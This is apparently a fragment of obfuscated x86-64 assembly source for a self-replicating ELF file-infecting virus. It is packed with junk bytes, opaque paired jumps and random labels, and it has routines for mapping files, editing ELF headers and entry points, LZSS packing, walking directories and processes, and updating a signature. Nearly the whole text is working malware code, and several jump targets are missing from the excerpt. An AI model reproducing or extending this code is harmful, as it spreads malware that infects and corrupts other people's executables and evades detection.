    cmp         QWORD m6, 0x00
    jb          ..@ETao9RplJ7Hj
    jae         ..@ETao9RplJ7Hj
..@I77vCwSqZfRa:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jl          ..@Czhbgw4iFmdV
    jge         ..@Czhbgw4iFmdV
..@pPVmN9Din2cH:
    cmp         DWORD [r1+1], "home"
    js          ..@SYpHwev0CshR
    jns         ..@SYpHwev0CshR
..@udRymWsTVKJs:
    VAR         packed, dirs_tmp
    jmp         $+4
db 0x50, 0xf4
    jmp         $+3
db 0x02
    jmp         ..@NpNNNmu2UWzz
..@HcziUTSAfYrU:
    ret
    jl          CreatePayload
    jge         CreatePayload
..@yF38D5ODtmf4:
    push        r1
    mov         r5, r1
    jl          ..@QU4B10syLazp
    jge         ..@QU4B10syLazp
..@NV87jAieeOt5:
    push        rdi
    pop         rdi
    pop         rbx
    jmp         ..@2kArYC6ulJy3
..@jNhnHVk9ALj3:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jl          ..@9jzuWAtzFXLE
    jge         ..@9jzuWAtzFXLE
..@2wYAkBl7hEQ1:
    pop         rcx
    call        IsNum
    test        eax, eax
    jmp         ..@oqSAdi0lK1Sh
..@tRq7C2D5LgpH:
    rep         stosb
    jl          ..@iSB9e2wpwzmw
    jge         ..@iSB9e2wpwzmw
..@qnPjVYfzyHAY:
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+4
db 0xd2, 0x8a
    jmp         $+4
db 0x58, 0x18
    je          ..@XHjYMsfO6Qfc
    jne         ..@XHjYMsfO6Qfc
..@vkfjYg6m91N0:
    push        r1
    xor         rdi, rdi
    js          ..@X6Jja6ec3Lx1
    jns         ..@X6Jja6ec3Lx1
..@DYp4u77rHkIN:
    mov         rcx, rcx
    jmp         $+5
db 0x81, 0x78, 0xbc
    js          ..@7r864M8HvvJp
    jns         ..@7r864M8HvvJp
..@Df2xaX41eULK:
    add         rdi, virus_len-_start
    mov         rsi, m7
    jmp         $+4
db 0xa3, 0x8c
    jmp         $+5
db 0x0f, 0xe7, 0x0c
    je          ..@jGBxrhwhbPnE
    jne         ..@jGBxrhwhbPnE
..@ohR2AvJyqbWk:
%ifdef X86_64
    mov         edx, 11b
%endif
    jmp         $+3
db 0xc4
    jmp         ..@4opl6BvMyMCB
..@5cK3493uVwyg:
%ifdef X86_32
    mov         ecx, r3
%endif
    jl          ..@iAbYZFAf8D96
    jge         ..@iAbYZFAf8D96
..@VeZDiSfqhhV7:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jmp         ..@cTj567dxWYgY
..@7QLR3TB0pwjW:
    push        rcx
    push        rbx
    jmp         $+5
db 0x65, 0x95, 0x8c
    jmp         ..@746X1KaE7DIz
..@zHh3SfBY21Uy:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xchg        rcx, rcx
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    je          ..@23ZgpS5mjmpA
    jne         ..@23ZgpS5mjmpA
..@Mrikde4YrZUL:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+5
db 0x3c, 0x8a, 0x9d
    js          ..@78hcIWxaQADy
    jns         ..@78hcIWxaQADy
..@kmWAgKRFJ2jW:
    sub         al, 0x02
    mov         edx, 1
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+5
db 0x8e, 0xa9, 0xa2
    jl          ..@HIdSBFkhSgk1
    jge         ..@HIdSBFkhSgk1
..@fNz41FPOkCVF:
    mov         rbx, rbx
    jl          ..@1F6xAH2rHeUz
    jge         ..@1F6xAH2rHeUz
..@mgMpsD6ykzQh:
    VAR         packed, status
    mov         r2, r5
    jmp         ..@KQKG8eTvVpsp
..@jaz9OkcVqKTL:
    jnz         ..@jyTrN3WX2YPX
    jmp         $+3
db 0x80
    js          ..@itFCq9te0GsZ
    jns         ..@itFCq9te0GsZ
..@Rimqi1MeAa7a:
    push        rdx
    je          ..@9mOQYwCjjcQ0
    jne         ..@9mOQYwCjjcQ0
..@upBcndUQxAgq:
    mov         rdi, rdi
    jl          ..@VkPS6Mktg2k9
    jge         ..@VkPS6Mktg2k9
..@oVKDqnpzgWas:
    call_vsp    ExitProgram
    jmp         $+3
db 0xea
    jmp         $+4
db 0x51, 0x3f
    js          ..@9t27meM0CY4w
    jns         ..@9t27meM0CY4w
MapFile:
    jmp         ..@w9VoXdb0i0Ru
..@RBGNSQwzhdX3:
    jne         ..@n6a3mHodPjkq
    jmp         $+4
db 0x6c, 0xb2
    je          ..@WBPab5C0MPAI
    jne         ..@WBPab5C0MPAI
..@VdNme6HvNsLW:
    xchg        rdx, rdx
    jl          ..@I0hmBwwfZJPD
    jge         ..@I0hmBwwfZJPD
..@jx5YNmOYF8fO:
    mov         r5, QWORD [r1+file.fileptr]
    mov         r1, QWORD [r5+e_h.e_shoff]
    jmp         $+5
db 0x55, 0x4b, 0x58
    jmp         ..@u2fp1XB79TJO
..@Wn68enxv9Vnj:
    VAR         packed, procs
    jl          ..@yI0wYCOcV3wH
    jge         ..@yI0wYCOcV3wH
..@EZUssc99on1a:
    je          ..@T2wpTqJE1Q6W
    jmp         ..@x678uq32skNY
    push        rcx
    jmp         $+5
db 0xa1, 0x05, 0xe6
    jmp         $+3
db 0xf6
    jmp         $+4
db 0xb8, 0x32
    jmp         ..@nQbaM9wzq7ar
..@6cICFlxkTDqJ:
    push        r1
    jb          ..@jx5YNmOYF8fO
    jae         ..@jx5YNmOYF8fO
..@nPLBpZrZ8Qcg:
    VAR         packed, dirs_root
    jmp         $+3
db 0xe2
    jl          ..@GRu3Bjow697u
    jge         ..@GRu3Bjow697u
..@9CNWaTUZMOb8:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+4
db 0xbc, 0xf6
    jmp         ..@TfnXlY9oK4M2
..@QNyD9MiLciud:
    xchg        rcx, rcx
    xor         rax, rax
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jmp         $+4
db 0xcc, 0xb9
    jmp         $+4
db 0x51, 0xc0
    jl          ..@QvLQTbrtyp45
    jge         ..@QvLQTbrtyp45
..@xIEp7cFxlpZX:
    pop         rsi
    jl          ..@0Gue3InNJQRB
    jge         ..@0Gue3InNJQRB
..@3LhKmuyvPMiQ:
    xor         r4, r4
    jmp         $+3
db 0x8b
    jmp         ..@Wn68enxv9Vnj
..@oqSAdi0lK1Sh:
    jz          ..@7H4hQvxeVdOX
    jb          ..@NQnrDC9D8iLq
    jae         ..@NQnrDC9D8iLq
..@WdnBKIHvj00q:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         ..@CX3Tc0Q6dBIw
..@GwkkxdFUGiyo:
    cmp         BYTE [r1], '.'
    jmp         $+5
db 0x82, 0x08, 0x09
    jmp         ..@hWOlrRgbJQ4m
..@ptMyK3P7Gy0U:
    mov         rbp, rbp
    call        Strcpy
    jmp         $+4
db 0x46, 0x79
    jb          ..@mgMpsD6ykzQh
    jae         ..@mgMpsD6ykzQh
..@rXpJi4iQWVbI:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    jb          ..@uvfVm5OccBtI
    jae         ..@uvfVm5OccBtI
..@0ReH9wdXf7pY:
    mov         rbp, rbp
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jmp         ..@dfDb1ZZ8PhFT
..@jGBxrhwhbPnE:
    sub         rsi, m6
    js          ..@29w9oKc1yexY
    jns         ..@29w9oKc1yexY
..@TBEVCKLbkKLA:
    xchg        rdx, rdx
    mov         QWORD [r2+p_h.p_offset], r3
    jb          ..@gSo27lZNG9h2
    jae         ..@gSo27lZNG9h2
..@mgQZmrmNBHsf:
    shr         edx, 1
    test        edx, edx
    jmp         ..@uPjRs0qfhEER
..@wNDbB8XiTneK:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jge         ..@zHh3SfBY21Uy
    jmp         $+5
db 0xff, 0x65, 0x0e
    jmp         ..@0GXe3ajxvwY5
..@vxMV6gdgWMYX:
    xor         rbx, rbx
    xor         rdx, rdx
    jmp         ..@WqSbxj7GPtqH
..@0IUqIA15Ck5N:
    xchg        rsp, rsp
    jl          ..@7RPVSHv1JPgm
    jge         ..@7RPVSHv1JPgm
..@StFyg7lXPgdc:
    mov         rbx, rbx
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         ..@nWKyMkIndYlI
..@XM8ZcUjuHEI9:
    push        r5
    xchg        rcx, rcx
    jmp         $+4
db 0xd7, 0x73
    jl          ..@smH1y1B5rkUe
    jge         ..@smH1y1B5rkUe
..@OBzaYpoSJlxy:
    rep         stosb
    je          ..@Feqb8D9XLvqF
    jne         ..@Feqb8D9XLvqF
..@PWn6VrktyxD6:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+5
db 0xcc, 0x7d, 0xe2
    jmp         $+5
db 0xaa, 0x26, 0x17
    jl          ..@h2cehasuBuJi
    jge         ..@h2cehasuBuJi
..@JMasbVVHyIER:
    xchg        rbx, rbx
    jl          ..@FZgk4H2QtdAA
    jmp         $+5
db 0xc3, 0x17, 0x65
    jmp         ..@3LhKmuyvPMiQ
..@SYpHwev0CshR:
    jne         ..@uVVpSXTwoi4l
    jmp         $+3
db 0x73
    jmp         ..@K7LLFwx4KTqh
..@HkGWMo5aFgme:
    mov         r2, vsp
    jmp         $+3
db 0xe1
    jmp         ..@EV0zvNpexTvo
..@tmpikIP337U5:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jmp         $+4
db 0x1d, 0xc5
    jl          ..@hDR6eusYefEP
    jge         ..@hDR6eusYefEP
..@IkkT2rPyHK4G:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         $+3
db 0x2e
    jmp         $+4
db 0xa4, 0x23
    jmp         $+3
db 0x84
    jmp         ..@I7FAJ1bwQTVm
..@f74dNVmPwNpr:
    sub         r5, 1
    jmp         $+5
db 0xc6, 0x8b, 0x06
    jmp         $+5
db 0x4c, 0x36, 0xcc
    jmp         $+5
db 0x20, 0xa5, 0x47
    jmp         ..@EmqdTAJ6goxw
..@QZNk3iIj418s:
    jne         ..@bCYVuOKD8RVx
    jmp         $+5
db 0x58, 0x98, 0x2c
    jmp         $+4
db 0x32, 0x32
    jmp         ..@RQzkSN9gMfxZ
..@yEk9YGRXr1Dj:
%ifdef X86_32
    xor         eax, eax
    mov         ecx, original_virus_len+PADDING
    mov         edx, 11b
%endif
    je          ..@q6vHynAF6CDx
    jne         ..@q6vHynAF6CDx
..@gT4LwZEOVJ5q:
    je          ..@FZgk4H2QtdAA
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    call_vsp    Strlen
    jmp         ..@YYiLOgcWwOoh
..@HniI838ZMEFp:
    and         r5, (PAGE_SIZE-1)
    jl          ..@5Mm2TuOtOm72
    jge         ..@5Mm2TuOtOm72
..@LJdVlnD3O3g2:
    mov         r1d, eax
    xchg        rax, rax
    mov         r3d, 0x02
    jmp         ..@GRSHuGlOmtZk
..@W87G0bloX7Gu:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    add         rsi, WINDOW_LENGTH
    jmp         $+3
db 0x80
    js          ..@DuuyfirsXxff
    jns         ..@DuuyfirsXxff
..@VmATBwKPJk2z:
    xor         rax, rax
    js          ..@oYl9oEf3Biba
    jns         ..@oYl9oEf3Biba
..@9TtIuND9Dojx:
    jmp         ..@saiKv9DLLWNY
    jmp         ..@94jNiw9qieam
..@WgjFBNW6OIGN:
    shr         dx, 0x4
    jb          ..@W3XF805cgmpp
    jae         ..@W3XF805cgmpp
..@gvbgtHP1m5RF:
    rep         nop
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jb          ..@dKVVWCOQoP27
    jae         ..@dKVVWCOQoP27
..@lqAXUTjIIzf0:
    mov         r5, r1
    jb          ..@ioY5zfecWfgz
    jae         ..@ioY5zfecWfgz
..@evhvF8uVil70:
    pop         r5
    pop         r4
    jmp         $+4
db 0xd6, 0xcb
    jmp         ..@T7OTChtoaahp
UpdateSignature:
    jmp         ..@bb0wweSr9FFO
..@WLZYp0zReahj:
    push        rbx
    jmp         $+3
db 0x3e
    jmp         ..@7ZGwUfEYfYIX
..@7tzD4HCu5wg7:
    xchg        rcx, rcx
    jmp         ..@7R1rCKZIBYVF
..@SVB4G9Ha0zJb:
    push        rsi
    push        rsi
    jmp         $+3
db 0x6c
    jl          ..@bN7Sucl1iSdy
    jge         ..@bN7Sucl1iSdy
..@KKuoEcPfZInN:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@arlr1AKx59HW
    jmp         ..@Xv74DtREo6Nl
..@qkl6fPMUet3k:
    add         ecx, 1
    rep         cmpsb
    jmp         $+3
db 0x84
    jmp         $+3
db 0xcc
    jmp         $+3
db 0x5f
    jmp         ..@ncAJmgHTPCro
..@CFHg47faWpBj:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jb          ..@t8qzGqWQ6n48
    jae         ..@t8qzGqWQ6n48
..@ejxOLwx2T3Sf:
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+3
db 0x54
    jmp         ..@zFE0aFWN3wD3
..@E3rHbkDWrKej:
    mov         rbp, rbp
    call        UnmapFile
    jmp         $+3
db 0xcb
    jmp         $+5
db 0x1c, 0x4d, 0x2a
    jmp         ..@8fl0P9Y6duTk
..@AImKnXiA0mAF:
    cmp         BYTE [r1], 0x00
    push        rdx
    pop         rdx
    jmp         $+4
db 0xe2, 0xdd
    je          ..@gT4LwZEOVJ5q
    jne         ..@gT4LwZEOVJ5q
..@alD64roY56CA:
    mov         rax, SYS_WAIT4
    syscall
    xchg        rsi, rsi
    jmp         $+5
db 0xce, 0xed, 0x85
    jmp         $+5
db 0x20, 0xc9, 0x55
    jmp         ..@G6PQASUnoc5B
..@avE0i1wYmfdP:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+3
db 0x57
    jl          ..@EAhcLZOvScv9
    jge         ..@EAhcLZOvScv9
..@ZdSUZ1Za4N5v:
    xchg        rdi, rdi
    jmp         ..@mrmSVw94A3TT
..@esfOVIlYGcC5:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    js          ..@Wbf07YEKhwu2
    jns         ..@Wbf07YEKhwu2
..@ITbYBXKq3ibu:
    je          ..@zHh3SfBY21Uy
    push        rdi
    pop         rdi
    jmp         $+4
db 0x35, 0xd3
    jmp         $+4
db 0x11, 0x2d
    jl          ..@8GWRgYD1l1V0
    jge         ..@8GWRgYD1l1V0
..@PrKiGzUPftaS:
    jne         ..@nRHeYDxx2GdG
    jmp         ..@e7Gg9t0MULjr
..@ArqFmCsYQGb9:
    add         r1, 2
    mov         ax, WORD [r1]
    push        rcx
    jb          ..@t1DvdJLGxpU2
    jae         ..@t1DvdJLGxpU2
..@mZzdLInJYoRj:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    jb          ..@rqwlaapy4t93
    jae         ..@rqwlaapy4t93
..@tuT6V4n95KoC:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jb          ..@iui0JI6DDaHi
    jae         ..@iui0JI6DDaHi
..@1qMJ6ucL4M3f:
    push        rax
    pop         rax
    jmp         $+4
db 0x24, 0x5c
    jmp         ..@q8MwgJWFxw4e
..@WqSbxj7GPtqH:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         ..@bybWDGZ8DtcH
..@6fQIX6iqD39S:
    mov         r2, QWORD [r5+file.fileptr]
    jmp         ..@y7VIaJxAJIXJ
..@N1FK3M8wctQb:
    cmp         eax, 0x00
    jl          ..@9t27meM0CY4w
    jmp         $+5
db 0x0a, 0xcf, 0xa3
    je          ..@C8d191RRST4a
    jne         ..@C8d191RRST4a
..@qhttCiOxUzjQ:
    jnz         ..@WHu075FUONVe
    push        rbx
    pop         rbx
    jmp         $+5
db 0xcf, 0x16, 0x4e
    js          ..@gWLLwIy8UrDH
    jns         ..@gWLLwIy8UrDH
..@CBaECkPl6xOd:
    push        r2
    sub         rsp, _DYNPIE_OFF_size
    js          ..@mEP4jdS52b6Q
    jns         ..@mEP4jdS52b6Q
..@lbeJtoZSP47z:
    push        rdi
    pop         rdi
    mov         r1, rax
    jmp         ..@HkGWMo5aFgme
..@e7Gg9t0MULjr:
    xor         rax, rax
    jmp         ..@QHouaXjNwyzV
    jmp         $+3
db 0x7b
    jl          ..@nRHeYDxx2GdG
    jge         ..@nRHeYDxx2GdG
..@9sbOmwEAyPXy:
    push        r4
    jmp         $+5
db 0x09, 0xe7, 0x5f
    jmp         $+4
db 0x4b, 0x83
    jl          ..@XM8ZcUjuHEI9
    jge         ..@XM8ZcUjuHEI9
..@FYE6lVqHljFs:
    mov         rax, rax
    jb          ..@oVKDqnpzgWas
    jae         ..@oVKDqnpzgWas
..@0G3YudtssGmi:
    rep         stosb
    jl          ..@aEkuGWh9Oe7T
    jge         ..@aEkuGWh9Oe7T
..@4dIyOB7uBfyU:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    push        rcx
    jmp         $+3
db 0x82
    jb          ..@ffirTugvGaqb
    jae         ..@ffirTugvGaqb
..@oYl9oEf3Biba:
    xor         rbx, rbx
    xchg        rcx, rcx
    jmp         $+5
db 0xbd, 0x49, 0x14
    jb          ..@7YKr770cr832
    jae         ..@7YKr770cr832
..@MbD6K8P7zmeS:
    push        rbx
    jmp         ..@NV87jAieeOt5
..@46t7aRbyd1aN:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         ..@Iog5upBVgaGZ
..@DpPhHYwiA2NJ:
    test        eax, eax
    jmp         $+4
db 0x99, 0xb3
    jmp         ..@Rimqi1MeAa7a
UnmapFile:
    jmp         ..@yF38D5ODtmf4
..@CBiwPVeIubrc:
    mov         rbx, rbx
    call        LzssEncoder
    mov         rdi, m6
    jmp         ..@EzjdlGPUGlBG
..@puMHtFSLuNUR:
    movzx       rax, BYTE [r2]
    mov         [r1], rax
    je          ..@Ai3YPPohvTgR
    jne         ..@Ai3YPPohvTgR
..@9t27meM0CY4w:
    add         rsp, 0x100
    jmp         $+4
db 0x0e, 0x6b
    jmp         $+4
db 0x9b, 0xd4
    jmp         $+4
db 0xbb, 0x69
    jmp         ..@kOjRuKH1BJ8x
..@CE6gQux7q2gB:
    mov         ax, WORD [r5+e_h.e_shentsize]
    jb          ..@m4j2APO4P1sQ
    jae         ..@m4j2APO4P1sQ
..@mg7HhjFA3TuN:
    cmp         r1, 0x00
    jmp         $+5
db 0x08, 0x45, 0xf7
    js          ..@MdP3vSiqByHX
    jns         ..@MdP3vSiqByHX
..@OPB0P5c6dRFc:
    push        r3
    jmp         $+5
db 0x90, 0x9e, 0xda
    jl          ..@CBaECkPl6xOd
    jge         ..@CBaECkPl6xOd
..@wWGllNrzMMCv:
%ifdef X86_64
    pop         rbx
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+4
db 0xfb, 0x69
    jl          ..@GvVvKi1mRuw9
    jge         ..@GvVvKi1mRuw9
..@EjWxEh8PJMab:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         ..@SEE1c3u1jdHM
..@an026x4hGLEN:
    xor         rbx, rbx
    jmp         $+3
db 0x55
    jmp         ..@5m2CbC05ti8y
..@oKFnaVMVC1bF:
    add         eax, 0x57
    jmp         ..@Sjao7QFtjUgJ
..@gSo27lZNG9h2:
    push        r2
    jmp         ..@56CVr7zIGBlS
..@zbaiuqvCRsst:
    sub         rsp, _PAYLOAD_OFF_size
    mov         rsp, rsp
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    jmp         $+4
db 0x2f, 0x1e
    jmp         ..@JK3yrvSdjvWH

_eof: